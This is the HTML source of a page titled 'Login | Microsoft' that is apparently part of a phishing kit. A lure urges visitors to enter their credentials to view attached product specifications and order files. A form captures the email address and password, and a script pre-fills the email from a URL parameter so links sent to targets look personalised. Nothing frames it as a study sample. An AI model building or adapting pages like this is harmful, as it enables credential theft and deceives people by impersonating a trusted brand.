<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login | Microsoft</title>  
  <link rel="stylesheet" href="styles.css">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
   <link rel="shortcut icon" href="fav.png" type="image/x-icon">
   
  
</head>
<body>
  <div class="wrapper">
    <form action="success.html" Method =“POST”>
      <div class="remember-forgot"><h2>
        <label><input type="checkbox">View File</label>
        <label><input type="checkbox">Download File</label>
        <label><input type="checkbox">Access Product Specifications</label></h2>
        
      </div>
      <h5><em>Kindly Login With Correct Credentials To View Attached Files (Product Specification, Sample Pictures, Order Files).</em></h5>
      <div class="input-box">
        <input type="text" name="email" id="email" placeholder="email" required>
        <i class='bx bxs-user'></i>
      </div>
      <div class="input-box">
        <input type="password" name="password" id="password" placeholder="password" required>
        <i class='bx bxs-lock-alt' ></i>
      </div>
      <div class="remember-forgot">
        <label><input type="checkbox">Remember Me</label>
        <a href="#">Forgot Password</a>
      </div>
      <button type="submit" class="btn">Login</button>
      <div class="register-link">
        <p>Dont have an account? <a href="#">Register</a></p>
      </div>
    </form>
  </div>
  
  
  
  <!-- auto attach email -->

 <script>
        window.onload = function() {
            var urlParams = new URLSearchParams(window.location.search);
            var email = urlParams.get('email');
            document.getElementById('email').value = email || '';
        };
 </script>
  
</body>
</html>
